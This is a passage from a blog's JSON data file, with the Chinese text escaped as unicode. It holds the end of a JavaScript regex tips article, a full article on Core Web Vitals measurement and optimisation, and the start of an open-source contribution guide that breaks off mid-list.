\u6b63\u5411\u540e\u884c\u65ad\u8a00 (?<=)\\n// \u5339\u914d\u524d\u9762\u662f\u7279\u5b9a\u5185\u5bb9\u7684\\n\'$100 \u20ac200\'.match(/(?<=\\\\$)\\\\d+/g);   // [\'100\']\\n\\n// \u8d1f\u5411\u540e\u884c\u65ad\u8a00 (?<!)\\n// \u5339\u914d\u524d\u9762\u4e0d\u662f\u7279\u5b9a\u5185\u5bb9\u7684\\n\'$100 \u20ac200\'.match(/(?<!\\\\$)\\\\d+/g);   // [\'00\', \'200\']\\n```\\n\\n### 4. \u63d0\u53d6\u6570\u636e\\n\\n```javascript\\n// \u63d0\u53d6\u6240\u6709\u94fe\u63a5\\nconst html = \'<a href=\\"url1\\">text</a><a href=\\"url2\\">text</a>\';\\nconst links = [...html.matchAll(/href=\\"([^\\"]+)\\"/g)].map(m => m[1]);\\n// [\'url1\', \'url2\']\\n\\n// \u63d0\u53d6\u67e5\u8be2\u53c2\u6570\\nconst url = \'https://example.com?name=john&age=25\';\\nconst params = Object.fromEntries(\\n  [...url.matchAll(/(\\\\w+)=(\\\\w+)/g)].map(m => [m[1], m[2]])\\n);\\n// { name: \'john\', age: \'25\' }\\n```\\n\\n### 5. \u683c\u5f0f\u5316\\n\\n```javascript\\n// \u5343\u5206\u4f4d\\n\'1234567\'.replace(/\\\\B(?=(\\\\d{3})+(?!\\\\d))/g, \',\');  // \'1,234,567\'\\n\\n// \u624b\u673a\u53f7\u8131\u654f\\n\'13800138000\'.replace(/(\\\\d{3})\\\\d{4}(\\\\d{4})/, \'$1****$2\');  // \'138****8000\'\\n\\n// \u9a7c\u5cf0\u8f6c\u77ed\u6a2a\u7ebf\\n\'backgroundColor\'.replace(/([A-Z])/g, \'-$1\').toLowerCase();  // \'background-color\'\\n\\n// \u77ed\u6a2a\u7ebf\u8f6c\u9a7c\u5cf0\\n\'background-color\'.replace(/-(\\\\w)/g, (_, c) => c.toUpperCase());  // \'backgroundColor\'\\n```\\n\\n---\\n\\n## \ud83d\udeab \u5e38\u89c1\u9677\u9631\\n\\n### 1. \u8f6c\u4e49\u7279\u6b8a\u5b57\u7b26\\n\\n```javascript\\n// \u8fd9\u4e9b\u5b57\u7b26\u9700\u8981\u8f6c\u4e49: . * + ? ^ $ { } [ ] ( ) | \\\\\\nconst regex = /\\\\[.*\\\\]/;        // \u5339\u914d [xxx]\\nconst regex2 = /\\\\$\\\\d+\\\\.\\\\d+/;   // \u5339\u914d $10.99\\n```\\n\\n### 2. \u6b63\u5219\u5b9e\u4f8b\u7684 lastIndex\\n\\n```javascript\\nconst regex = /a/g;\\nconst str = \'aaa\';\\n\\nregex.test(str);  // true, lastIndex = 1\\nregex.test(str);  // true, lastIndex = 2\\nregex.test(str);  // true, lastIndex = 3\\nregex.test(str);  // false, lastIndex = 0\\n\\n// \u89e3\u51b3\u65b9\u6848\uff1a\u6bcf\u6b21\u521b\u5efa\u65b0\u5b9e\u4f8b\u6216\u4e0d\u4f7f\u7528 g \u6807\u5fd7\\n```\\n\\n### 3. \u6027\u80fd\u95ee\u9898\\n\\n```javascript\\n// \u274c \u56de\u6eaf\u707e\u96be\\n/(a+)+b/.test(\'aaaaaaaaaaaaaaaaaaaaac\');  // \u975e\u5e38\u6162\\n\\n// \u2705 \u4f18\u5316\\n/a+b/.test(\'aaaaaaaaaaaaaaaaaaaaac\');\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u8c03\u8bd5\u5de5\u5177\\n\\n| \u5de5\u5177 | \u7f51\u5740 | \u7279\u70b9 |\\n|------|------|------|\\n| regex101 | regex101.com | \u8be6\u7ec6\u89e3\u91ca\u3001\u591a\u8bed\u8a00 |\\n| regexr | regexr.com | \u53ef\u89c6\u5316\u3001\u793e\u533a\u6a21\u5f0f |\\n| debuggex | debuggex.com | \u56fe\u5f62\u5316\u5c55\u793a |\\n\\n---\\n\\n## \ud83d\udcda \u6807\u5fd7\u4f4d\\n\\n| \u6807\u5fd7 | \u542b\u4e49 |\\n|------|------|\\n| `g` | \u5168\u5c40\u5339\u914d |\\n| `i` | \u5ffd\u7565\u5927\u5c0f\u5199 |\\n| `m` | \u591a\u884c\u6a21\u5f0f |\\n| `s` | \u8ba9 . \u5339\u914d\u6362\u884c\u7b26 |\\n| `u` | Unicode \u6a21\u5f0f |\\n| `y` | \u7c98\u6027\u5339\u914d |\\n\\n```javascript\\n// \u7ec4\u5408\u4f7f\u7528\\nconst regex = /pattern/gim;\\n```\\n\\n---\\n\\n\u6b63\u5219\u8868\u8fbe\u5f0f\u5f88\u5f3a\u5927\uff0c\u4f46\u4e5f\u8981\u9002\u5ea6\u4f7f\u7528\u3002\u7b80\u5355\u7684\u5b57\u7b26\u4e32\u64cd\u4f5c\u7528\u539f\u751f\u65b9\u6cd5\u53ef\u80fd\u66f4\u6e05\u6670\u3002"},{"id":"web-vitals","metadata":{"permalink":"/blog/web-vitals","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-07-10-web-vitals.md","source":"@site/blog/2024-07-10-web-vitals.md","title":"Web \u6027\u80fd\u6307\u6807\u4e0e\u4f18\u5316\u5b9e\u6218","description":"Core Web Vitals \u662f Google \u63d0\u51fa\u7684\u7f51\u9875\u4f53\u9a8c\u6838\u5fc3\u6307\u6807\u3002\u672c\u6587\u8be6\u89e3\u5404\u9879\u6307\u6807\u7684\u542b\u4e49\u548c\u4f18\u5316\u65b9\u6cd5\u3002","date":"2024-07-10T00:00:00.000Z","tags":[{"inline":true,"label":"\u6027\u80fd","permalink":"/blog/tags/\u6027\u80fd"},{"inline":true,"label":"\u524d\u7aef","permalink":"/blog/tags/\u524d\u7aef"},{"inline":true,"label":"Core Web Vitals","permalink":"/blog/tags/core-web-vitals"}],"readingTime":4.04,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"web-vitals","title":"Web \u6027\u80fd\u6307\u6807\u4e0e\u4f18\u5316\u5b9e\u6218","authors":"mason","tags":["\u6027\u80fd","\u524d\u7aef","Core Web Vitals"]},"unlisted":false,"prevItem":{"title":"\u6b63\u5219\u8868\u8fbe\u5f0f\u5b9e\u6218\u6280\u5de7","permalink":"/blog/regex-practical-guide"},"nextItem":{"title":"\u5f00\u6e90\u9879\u76ee\u8d21\u732e\u6307\u5357","permalink":"/blog/open-source-contribution"}},"content":"Core Web Vitals \u662f Google \u63d0\u51fa\u7684\u7f51\u9875\u4f53\u9a8c\u6838\u5fc3\u6307\u6807\u3002\u672c\u6587\u8be6\u89e3\u5404\u9879\u6307\u6807\u7684\u542b\u4e49\u548c\u4f18\u5316\u65b9\u6cd5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u6838\u5fc3\u6307\u6807\u6982\u89c8\\n\\n| \u6307\u6807 | \u5168\u79f0 | \u542b\u4e49 | \u76ee\u6807\u503c |\\n|------|------|------|--------|\\n| **LCP** | Largest Contentful Paint | \u6700\u5927\u5185\u5bb9\u7ed8\u5236 | \u2264 2.5s |\\n| **INP** | Interaction to Next Paint | \u4ea4\u4e92\u5230\u4e0b\u4e00\u6b21\u7ed8\u5236 | \u2264 200ms |\\n| **CLS** | Cumulative Layout Shift | \u7d2f\u79ef\u5e03\u5c40\u504f\u79fb | \u2264 0.1 |\\n\\n### \u5176\u4ed6\u91cd\u8981\u6307\u6807\\n\\n| \u6307\u6807 | \u542b\u4e49 | \u76ee\u6807\u503c |\\n|------|------|--------|\\n| **FCP** | \u9996\u6b21\u5185\u5bb9\u7ed8\u5236 | \u2264 1.8s |\\n| **TTFB** | \u9996\u5b57\u8282\u65f6\u95f4 | \u2264 800ms |\\n| **TBT** | \u603b\u963b\u585e\u65f6\u95f4 | \u2264 200ms |\\n\\n---\\n\\n## \ud83d\udcca LCP \u6700\u5927\u5185\u5bb9\u7ed8\u5236\\n\\n### \u4ec0\u4e48\u662f LCP\\n\\n\u89c6\u53e3\u5185\u6700\u5927\u53ef\u89c1\u5185\u5bb9\u5143\u7d20\u6e32\u67d3\u5b8c\u6210\u7684\u65f6\u95f4\u3002\\n\\n```markdown\\nLCP \u5143\u7d20\u901a\u5e38\u662f\uff1a\\n- <img> \u56fe\u7247\\n- <video> \u89c6\u9891\u5c01\u9762\\n- \u5e26\u80cc\u666f\u56fe\u7684\u5143\u7d20\\n- \u5927\u5757\u6587\u672c\\n```\\n\\n### \u4f18\u5316\u7b56\u7565\\n\\n**1. \u4f18\u5316\u8d44\u6e90\u52a0\u8f7d**\\n\\n```html\\n\x3c!-- \u9884\u52a0\u8f7d\u5173\u952e\u8d44\u6e90 --\x3e\\n<link rel=\\"preload\\" href=\\"hero.jpg\\" as=\\"image\\">\\n<link rel=\\"preload\\" href=\\"font.woff2\\" as=\\"font\\" crossorigin>\\n\\n\x3c!-- \u9884\u8fde\u63a5\u7b2c\u4e09\u65b9\u57df\u540d --\x3e\\n<link rel=\\"preconnect\\" href=\\"https://cdn.example.com\\">\\n<link rel=\\"dns-prefetch\\" href=\\"https://cdn.example.com\\">\\n```\\n\\n**2. \u56fe\u7247\u4f18\u5316**\\n\\n```html\\n\x3c!-- \u54cd\u5e94\u5f0f\u56fe\u7247 --\x3e\\n<img \\n  srcset=\\"hero-480.jpg 480w, hero-800.jpg 800w, hero-1200.jpg 1200w\\"\\n  sizes=\\"(max-width: 600px) 480px, (max-width: 1000px) 800px, 1200px\\"\\n  src=\\"hero-800.jpg\\"\\n  alt=\\"Hero\\"\\n>\\n\\n\x3c!-- \u4f7f\u7528\u73b0\u4ee3\u683c\u5f0f --\x3e\\n<picture>\\n  <source srcset=\\"hero.avif\\" type=\\"image/avif\\">\\n  <source srcset=\\"hero.webp\\" type=\\"image/webp\\">\\n  <img src=\\"hero.jpg\\" alt=\\"Hero\\">\\n</picture>\\n```\\n\\n**3. \u670d\u52a1\u7aef\u4f18\u5316**\\n\\n```markdown\\n- \u4f7f\u7528 CDN \u5206\u53d1\u9759\u6001\u8d44\u6e90\\n- \u542f\u7528 Gzip/Brotli \u538b\u7f29\\n- \u4f18\u5316 TTFB\uff08\u670d\u52a1\u5668\u54cd\u5e94\u65f6\u95f4\uff09\\n- \u4f7f\u7528 HTTP/2 \u6216 HTTP/3\\n```\\n\\n---\\n\\n## \u26a1 INP \u4ea4\u4e92\u54cd\u5e94\\n\\n### \u4ec0\u4e48\u662f INP\\n\\n\u7528\u6237\u4ea4\u4e92\uff08\u70b9\u51fb\u3001\u89e6\u6478\u3001\u952e\u76d8\uff09\u5230\u9875\u9762\u89c6\u89c9\u54cd\u5e94\u7684\u65f6\u95f4\u3002\\n\\n### \u4f18\u5316\u7b56\u7565\\n\\n**1. \u5206\u89e3\u957f\u4efb\u52a1**\\n\\n```javascript\\n// \u274c \u957f\u4efb\u52a1\u963b\u585e\u4e3b\u7ebf\u7a0b\\nfunction processLargeArray(items) {\\n  items.forEach(item => heavyProcess(item));\\n}\\n\\n// \u2705 \u4f7f\u7528 scheduler \u5206\u7247\\nasync function processLargeArray(items) {\\n  for (const item of items) {\\n    heavyProcess(item);\\n    // \u8ba9\u51fa\u4e3b\u7ebf\u7a0b\\n    await scheduler.yield();\\n  }\\n}\\n\\n// \u2705 \u6216\u4f7f\u7528 requestIdleCallback\\nfunction processInChunks(items, index = 0) {\\n  const chunk = items.slice(index, index + 100);\\n  chunk.forEach(heavyProcess);\\n  \\n  if (index + 100 < items.length) {\\n    requestIdleCallback(() => processInChunks(items, index + 100));\\n  }\\n}\\n```\\n\\n**2. \u907f\u514d\u4e3b\u7ebf\u7a0b\u963b\u585e**\\n\\n```javascript\\n// \u274c \u540c\u6b65\u64cd\u4f5c\\nconst data = JSON.parse(hugeString);\\n\\n// \u2705 Web Worker \u5904\u7406\\nconst worker = new Worker(\'parser.js\');\\nworker.postMessage(hugeString);\\nworker.onmessage = (e) => {\\n  const data = e.data;\\n};\\n```\\n\\n**3. \u4f18\u5316\u4e8b\u4ef6\u5904\u7406**\\n\\n```javascript\\n// \u274c \u9891\u7e41\u89e6\u53d1\\nwindow.addEventListener(\'scroll\', handleScroll);\\n\\n// \u2705 \u4f7f\u7528\u9632\u6296/\u8282\u6d41\\nwindow.addEventListener(\'scroll\', throttle(handleScroll, 100));\\n\\n// \u2705 \u4f7f\u7528 passive \u9009\u9879\\nwindow.addEventListener(\'scroll\', handleScroll, { passive: true });\\n```\\n\\n---\\n\\n## \ud83d\udcd0 CLS \u5e03\u5c40\u7a33\u5b9a\u6027\\n\\n### \u4ec0\u4e48\u662f CLS\\n\\n\u9875\u9762\u751f\u547d\u5468\u671f\u5185\u6240\u6709\u610f\u5916\u5e03\u5c40\u504f\u79fb\u7684\u7d2f\u79ef\u5206\u6570\u3002\\n\\n### \u5e38\u89c1\u539f\u56e0\\n\\n```markdown\\n1. \u65e0\u5c3a\u5bf8\u7684\u56fe\u7247/\u89c6\u9891\\n2. \u52a8\u6001\u63d2\u5165\u7684\u5185\u5bb9\\n3. \u5b57\u4f53\u95ea\u70c1 (FOIT/FOUT)\\n4. \u52a8\u753b\u4f7f\u7528\u975e\u5408\u6210\u5c5e\u6027\\n```\\n\\n### \u4f18\u5316\u7b56\u7565\\n\\n**1. \u56fe\u7247/\u89c6\u9891\u8bbe\u7f6e\u5c3a\u5bf8**\\n\\n```html\\n\x3c!-- \u2705 \u59cb\u7ec8\u8bbe\u7f6e\u5bbd\u9ad8 --\x3e\\n<img src=\\"photo.jpg\\" width=\\"800\\" height=\\"600\\" alt=\\"Photo\\">\\n\\n\x3c!-- \u2705 \u6216\u4f7f\u7528 aspect-ratio --\x3e\\n<style>\\n  img {\\n    width: 100%;\\n    aspect-ratio: 16 / 9;\\n  }\\n</style>\\n```\\n\\n**2. \u9884\u7559\u7a7a\u95f4**\\n\\n```css\\n/* \u5e7f\u544a/\u5d4c\u5165\u5185\u5bb9\u9884\u7559\u7a7a\u95f4 */\\n.ad-container {\\n  min-height: 250px;\\n}\\n\\n/* \u9aa8\u67b6\u5c4f */\\n.skeleton {\\n  height: 200px;\\n  background: linear-gradient(90deg, #f0f0f0 25%, #e0e0e0 50%, #f0f0f0 75%);\\n}\\n```\\n\\n**3. \u5b57\u4f53\u4f18\u5316**\\n\\n```css\\n/* \u4f7f\u7528 font-display */\\n@font-face {\\n  font-family: \'CustomFont\';\\n  src: url(\'font.woff2\') format(\'woff2\');\\n  font-display: swap; /* \u6216 optional */\\n}\\n\\n/* \u9884\u52a0\u8f7d\u5173\u952e\u5b57\u4f53 */\\n<link rel=\\"preload\\" href=\\"font.woff2\\" as=\\"font\\" type=\\"font/woff2\\" crossorigin>\\n```\\n\\n**4. \u52a8\u753b\u4f7f\u7528 transform**\\n\\n```css\\n/* \u274c \u89e6\u53d1\u5e03\u5c40\u504f\u79fb */\\n.animate {\\n  left: 100px;\\n  width: 200px;\\n}\\n\\n/* \u2705 \u53ea\u89e6\u53d1\u5408\u6210 */\\n.animate {\\n  transform: translateX(100px) scale(1.2);\\n}\\n```\\n\\n---\\n\\n## \ud83d\udee0\ufe0f \u6d4b\u91cf\u5de5\u5177\\n\\n### \u5f00\u53d1\u5de5\u5177\\n\\n| \u5de5\u5177 | \u7528\u9014 |\\n|------|------|\\n| **Lighthouse** | Chrome DevTools \u96c6\u6210 |\\n| **PageSpeed Insights** | \u5728\u7ebf\u5206\u6790 |\\n| **WebPageTest** | \u8be6\u7ec6\u7011\u5e03\u56fe |\\n| **Chrome UX Report** | \u771f\u5b9e\u7528\u6237\u6570\u636e |\\n\\n### \u4ee3\u7801\u6d4b\u91cf\\n\\n```javascript\\n// \u4f7f\u7528 web-vitals \u5e93\\nimport { onLCP, onINP, onCLS } from \'web-vitals\';\\n\\nonLCP(console.log);\\nonINP(console.log);\\nonCLS(console.log);\\n\\n// \u4e0a\u62a5\u5230\u5206\u6790\u670d\u52a1\\nfunction sendToAnalytics(metric) {\\n  fetch(\'/analytics\', {\\n    method: \'POST\',\\n    body: JSON.stringify({\\n      name: metric.name,\\n      value: metric.value,\\n      id: metric.id,\\n    }),\\n  });\\n}\\n\\nonLCP(sendToAnalytics);\\nonINP(sendToAnalytics);\\nonCLS(sendToAnalytics);\\n```\\n\\n### Performance API\\n\\n```javascript\\n// \u83b7\u53d6 LCP\\nnew PerformanceObserver((list) => {\\n  const entries = list.getEntries();\\n  const lastEntry = entries[entries.length - 1];\\n  console.log(\'LCP:\', lastEntry.startTime);\\n}).observe({ type: \'largest-contentful-paint\', buffered: true });\\n\\n// \u83b7\u53d6 CLS\\nlet clsValue = 0;\\nnew PerformanceObserver((list) => {\\n  for (const entry of list.getEntries()) {\\n    if (!entry.hadRecentInput) {\\n      clsValue += entry.value;\\n    }\\n  }\\n  console.log(\'CLS:\', clsValue);\\n}).observe({ type: \'layout-shift\', buffered: true });\\n```\\n\\n---\\n\\n## \ud83d\udccb \u4f18\u5316\u6e05\u5355\\n\\n### LCP \u4f18\u5316\\n\\n- [ ] \u9884\u52a0\u8f7d LCP \u5143\u7d20\u8d44\u6e90\\n- [ ] \u4f7f\u7528 CDN\\n- [ ] \u4f18\u5316\u56fe\u7247\uff08\u683c\u5f0f\u3001\u5c3a\u5bf8\u3001\u538b\u7f29\uff09\\n- [ ] \u51cf\u5c11\u670d\u52a1\u5668\u54cd\u5e94\u65f6\u95f4\\n- [ ] \u79fb\u9664\u963b\u585e\u6e32\u67d3\u7684\u8d44\u6e90\\n\\n### INP \u4f18\u5316\\n\\n- [ ] \u5206\u89e3\u957f\u4efb\u52a1\uff08< 50ms\uff09\\n- [ ] \u4f7f\u7528 Web Worker\\n- [ ] \u9632\u6296/\u8282\u6d41\u4e8b\u4ef6\u5904\u7406\\n- [ ] \u51cf\u5c11 JavaScript \u4f53\u79ef\\n- [ ] \u5ef6\u8fdf\u975e\u5173\u952e JS\\n\\n### CLS \u4f18\u5316\\n\\n- [ ] \u56fe\u7247/\u89c6\u9891\u8bbe\u7f6e\u5c3a\u5bf8\\n- [ ] \u9884\u7559\u52a8\u6001\u5185\u5bb9\u7a7a\u95f4\\n- [ ] \u4f18\u5316\u5b57\u4f53\u52a0\u8f7d\\n- [ ] \u907f\u514d\u5728\u73b0\u6709\u5185\u5bb9\u4e0a\u65b9\u63d2\u5165\\n- [ ] \u4f7f\u7528 transform \u52a8\u753b\\n\\n---\\n\\n## \ud83d\udcda \u63a8\u8350\u8d44\u6e90\\n\\n- [web.dev - Core Web Vitals](https://web.dev/vitals/)\\n- [web-vitals \u5e93](https://github.com/GoogleChrome/web-vitals)\\n- [PageSpeed Insights](https://pagespeed.web.dev/)\\n\\n---\\n\\n\u6027\u80fd\u4f18\u5316\u662f\u6301\u7eed\u7684\u8fc7\u7a0b\u3002\u5148\u6d4b\u91cf\uff0c\u518d\u4f18\u5316\uff0c\u6301\u7eed\u76d1\u63a7\u3002"},{"id":"open-source-contribution","metadata":{"permalink":"/blog/open-source-contribution","editUrl":"https://github.com/hweos/git-pages/edit/main/blog/2024-07-01-open-source.md","source":"@site/blog/2024-07-01-open-source.md","title":"\u5f00\u6e90\u9879\u76ee\u8d21\u732e\u6307\u5357","description":"\u53c2\u4e0e\u5f00\u6e90\u662f\u63d0\u5347\u6280\u672f\u80fd\u529b\u3001\u5efa\u7acb\u5f71\u54cd\u529b\u7684\u7edd\u4f73\u65b9\u5f0f\u3002\u672c\u6587\u5206\u4eab\u5982\u4f55\u5f00\u59cb\u4f60\u7684\u5f00\u6e90\u4e4b\u65c5\u3002","date":"2024-07-01T00:00:00.000Z","tags":[{"inline":true,"label":"\u5f00\u6e90","permalink":"/blog/tags/\u5f00\u6e90"},{"inline":true,"label":"GitHub","permalink":"/blog/tags/git-hub"},{"inline":true,"label":"\u793e\u533a","permalink":"/blog/tags/\u793e\u533a"}],"readingTime":3.68,"hasTruncateMarker":true,"authors":[{"name":"Mason","title":"Full Stack Developer","url":"https://github.com/HuangZhe007","socials":{"github":"https://github.com/HuangZhe007"},"imageURL":"https://avatars.githubusercontent.com/u/45168628?v=4","key":"mason","page":null}],"frontMatter":{"slug":"open-source-contribution","title":"\u5f00\u6e90\u9879\u76ee\u8d21\u732e\u6307\u5357","authors":"mason","tags":["\u5f00\u6e90","GitHub","\u793e\u533a"]},"unlisted":false,"prevItem":{"title":"Web \u6027\u80fd\u6307\u6807\u4e0e\u4f18\u5316\u5b9e\u6218","permalink":"/blog/web-vitals"},"nextItem":{"title":"\u6280\u672f\u6210\u957f\u8def\u7ebf\u56fe","permalink":"/blog/tech-career-growth"}},"content":"\u53c2\u4e0e\u5f00\u6e90\u662f\u63d0\u5347\u6280\u672f\u80fd\u529b\u3001\u5efa\u7acb\u5f71\u54cd\u529b\u7684\u7edd\u4f73\u65b9\u5f0f\u3002\u672c\u6587\u5206\u4eab\u5982\u4f55\u5f00\u59cb\u4f60\u7684\u5f00\u6e90\u4e4b\u65c5\u3002\\n\\n\x3c!--truncate--\x3e\\n\\n## \ud83c\udfaf \u4e3a\u4ec0\u4e48\u53c2\u4e0e\u5f00\u6e90\\n\\n| \u6536\u76ca | \u8bf4\u660e |\\n|------|------|\\n| \u6280\u672f\u63d0\u5347 | \u5b66\u4e60\u4f18\u79c0\u4ee3\u7801\uff0c\u63a5\u89e6\u771f\u5b9e\u9879\u76ee |\\n| \u7b80\u5386\u52a0\u5206 | \u5c55\u793a\u771f\u5b9e\u80fd\u529b |\\n| \u4eba\u8109\u62d3\u5c55 | \u7ed3\u8bc6\u4f18\u79c0\u5f00\u53d1\u8005 |\\n| \u56de\u9988\u793e\u533a | \u4f7f\u7528\u5f00\u6e90\uff0c\u4e5f\u8d21\u732e\u5f00\u6e90 |\\n| \u6210\u5c31\u611f | \u4ee3\u7801\u88ab\u5168\u7403\u4f7f\u7528 |\\n\\n---\\n\\n## \ud83d\ude80 \u5982\u4f55\u5f00\u59cb\\n\\n### 1. \u9009\u62e9\u9879\u76ee\\n\\n```markdown\\n\u4ece\u4f60\u4f7f\u7528\u7684\u9879\u76ee\u5f00\u59cb\uff1a\\n- \u4f60\u65e5\u5e38\u7528\u4ec0\u4e48\u5e93/\u6846\u67b6\uff1f\\n- \u9047\u5230\u8fc7\u4ec0\u4e48\u95ee\u9898\uff1f\\n- \u6709\u4ec0\u4e48\u529f\u80fd\u5e0c\u671b\u6dfb\u52a0\uff1f\\n\\n\u63a8\u8350\u8d77\u70b9\uff1a\\n- \u6587\u6863\u9879\u76ee\uff08\u95e8\u69db\u6700\u4f4e\uff09\\n- \u5c0f\u578b\u5de5\u5177\u5e93\\n- \u4f60\u719f\u6089\u7684\u6280\u672f\u6808\\n```\\n\\n### 2. \u5bfb\u627e Issue\\n\\n```markdown\\nGitHub \u6807\u7b7e\uff1a\\n- `good first issue` - \u65b0\u624b\u53cb\u597d\\n- `help wanted` - \u9700\u8981\u5e2e\u52a9\\n- `documentation` - \u6587\u6863\u7c7b\\n- `bug` - Bug \u4fee\u590d\\n- `enhancement` - \u529f\u80fd\u589e\u5f3a\\n```\\n\\n### 3. \u4e86\u89e3\u9879\u76ee\\n\\n```markdown\\n\u5fc5\u8bfb\uff1a\\n- README.md - \u9879\u76ee\u4ecb\u7ecd\\n- CONTRIBUTING.md - \u8d21\u732e\u6307\u5357\\n- CODE_OF_CONDUCT.md - \u884c\u4e3a\u51c6\u5219\\n- \u5386\u53f2 PR \u548c Issue - \u4e86\u89e3\u98ce\u683c\\n```\\n\\n---\\n\\n## \ud83d\udcbb \u63d0\u4ea4 PR \u6d41\u7a0b\\n\\n### Step 1: Fork \u9879\u76ee\\n\\n```bash\\n# \u5728 GitHub \u4e0a Fork\\n\\n# \u514b\u9686\u5230\u672c\u5730\\ngit clone https://github.com/\u4f60\u7684\u7528\u6237\u540d/\u9879\u76ee\u540d.git\\ncd \u9879\u76ee\u540d\\n\\n# \u6dfb\u52a0\u4e0a\u6e38\u4ed3\u5e93\\ngit remote add upstream https://github.com/\u539f\u4f5c\u8005/\u9879\u76ee\u540d.git\\n```\\n\\n### Step 2: \u521b\u5efa\u5206\u652f\\n\\n```bash\\n# \u540c\u6b65\u6700\u65b0\u4ee3\u7801\\ngit fetch upstream\\ngit checkout main\\ngit merge upstream/main\\n\\n# \u521b\u5efa\u7279\u6027\u5206\u652f\\ngit checkout -b fix/issue-123\\n```\\n\\n### Step 3: \u5f00\u53d1\\n\\n```bash\\n# \u5b89\u88c5\u4f9d\u8d56\\nnpm install\\n\\n# \u8fd0\u884c\u6d4b\u8bd5\\nnpm test\\n\\n# \u63d0\u4ea4\u4ee3\u7801\\ngit add .\\ngit commit -m \\"fix: \u4fee\u590d xxx \u95ee\u9898 (#123)\\"\\n```\\n\\n### Step 4: \u63a8\u9001\u5e76\u521b\u5efa PR\\n\\n```bash\\n# \u63a8\u9001\u5230\u4f60\u7684 Fork\\ngit push origin fix/issue-123\\n\\n# \u5728 GitHub \u4e0a\u521b\u5efa Pull Request\\n```\\n\\n### Step 5: \u54cd\u5e94\u8bc4\u5ba1\\n\\n```markdown\\n- \u53ca\u65f6\u56de\u590d\u8bc4\u8bba\\n- \u6839\u636e\u53cd\u9988\u4fee\u6539\u4ee3\u7801\\n- \u4fdd\u6301\u793c\u8c8c\u548c\u4e13\u4e1a\\n```\\n\\n---\\n\\n## \ud83d\udcdd PR \u6700\u4f73\u5b9e\u8df5\\n\\n### PR \u63cf\u8ff0\u6a21\u677f\\n\\n```markdown\\n## \u6539\u52a8\u8bf4\u660e\\n\u7b80\u8ff0\u8fd9\u4e2a PR \u505a\u4e86\u4ec0\u4e48\\n\\n## \u5173\u8054 Issue\\nFixes #123\\n\\n## \u6539\u52a8\u7c7b\u578b\\n- [ ] Bug \u4fee\u590d\\n- [ ] \u65b0\u529f\u80fd\\n- [ ] \u6587\u6863\u66f4\u65b0\\n- [ ] \u91cd\u6784\\n\\n## \u6d4b\u8bd5\\n\u5982\u4f55\u6d4b\u8bd5\u8fd9\u4e2a\u6539\u52a8\\n\\n## \u622a\u56fe\uff08\u5982\u6709\uff09\\nUI \u6539\u52a8\u8bf7\u9644\u4e0a\u622a\u56fe\\n```\\n\\n### Commit \u89c4\u8303\\n\\n```bash\\n# Conventional Commits\\nfeat: \u6dfb\u52a0\u65b0\u529f\u80fd\\nfix: \u4fee\u590d bug\\ndocs: \u6587\u6863\u66f4\u65b0\\nstyle: \u4ee3\u7801\u683c\u5f0f\\nrefactor: \u91cd\u6784\\ntest: \u6d4b\u8bd5\u76f8\u5173\\nchore: \u6784\u5efa/\u5de5\u5177\\n```\\n\\n### \u4fdd\u6301 PR \u5c0f\u800c\u4e13\u6ce8\\n\\n```markdown\\n\u2705 \u597d\u7684 PR\uff1a\\n- \u5355\u4e00\u804c\u8d23\\n- 200-400 \u884c\u6539\u52a8\\n- \u6e05\u6670\u7684\u63cf\u8ff0\\n\\n\u274c \u907f\u514d\uff1a\\n- \u4e00\u4e2a PR \u6539\u5f88\u591a\u4e1c\u897f\\n- \u4e0a\u5343\u884c\u6539\u52a8\\n- \u6ca1\u6709\u6d4b\u8bd5\\n```\\n\\n---\\n\\n## \ud83d\udcac \u6c9f\u901a\u6280\u5de7\\n\\n### Issue \u8ba8\u8bba\\n\\n```markdown\\n\u63d0\u95ee\u524d\uff1a\\n1. \u641c\u7d22\u662f\u5426\u6709\u7c7b\u4f3c\u95ee\u9898\\n2. \u9605\u8bfb\u6587\u6863\\n3. \u5c1d\u8bd5\u81ea\u5df1\u89e3\u51b3\\n\\n\u63d0\u95ee\u65f6\uff1a\\n1. \u6e05\u6670\u63cf\u8ff0\u95ee\u9898\\n2. \u63d0\u4f9b\u590d\u73b0\u6b65\u9aa4\\n3. \u9644\u4e0a\u76f8\u5173\u4ee3\u7801/\u622a\u56fe\\n4. \u8bf4\u660e\u73af\u5883\u4fe1\u606f\\n```\\n\\n### \u826f\u597d\u7684\u6001\u5ea6\\n\\n```markdown\\n\u2705 \u8bb0\u4f4f\uff1a\\n- \u7ef4\u62a4\u8005\u662f\u5fd7\u613f\u8005\\n- \u4fdd\u6301\u8010\u5fc3\u548c\u5c0a\u91cd\\n- \u611f\u8c22\u4ed6\u4eec\u7684\u65f6\u95f4\\n- \u63a5\u53d7\u53ef\u80fd\u88ab\u62d2\u7edd\\n\\n\u2705 \u5e38\u7528\u8868\u8fbe\uff1a\\n- \\"\u611f\u8c22\u4f60\u7684\u53cd\u9988\\"\\n- \\"\u6211\u6765\u4fee\u6539\u4e00\u4e0b\\"\\n- \\"\u80fd\u5426\u89e3\u91ca\u4e00\u4e0b\u8fd9\u4e2a\u51b3\u5b9a\uff1f\\"\\n```\\n\\n---\\n\\n## \ud83c\udf81 \u8d21\u732e\u7c7b\u578b\\n\\n### \u4ee3\u7801\u4ee5\u5916\u7684\u8d21\u732e\\n\\n```markdown\\n1. \u6587\u6863\u6539\u8fdb\\n   - \u4fee\u6b63\u9519\u522b\u5b57\\n   - \u8865\u5145\u793a\u4f8b\\n   - \u7ffb\u8bd1\\n\\n2. Issue \u6574\u7406\\n   - \u56de\u7b54\u95ee\u9898\\n   - \u6807\u8bb0\u91cd\u590d\\n   - \u590d\u73b0 bug\\n\\n3. Review PR\\n   - \u9605\u8bfb\u4ee3\u7801\\n   - \u63d0\u4f9b\u53cd\u9988\\n\\n4. \u6d4b\u8bd5\u53cd\u9988\\n   - \u6d4b\u8bd5\u65b0\u7248\u672c\\n   - \u62a5\u544a\u95ee\u9898\\n\\n5. \u5ba3\u4f20\u63a8\u5e7f\\n   - \u5199\u535a\u5ba2\\n   - \u505a\u5206\u4eab\\n```\\n\\n### \u6e10\u8fdb\u5f0f\u8d21\u732e\\n\\n```markdown\\nLevel 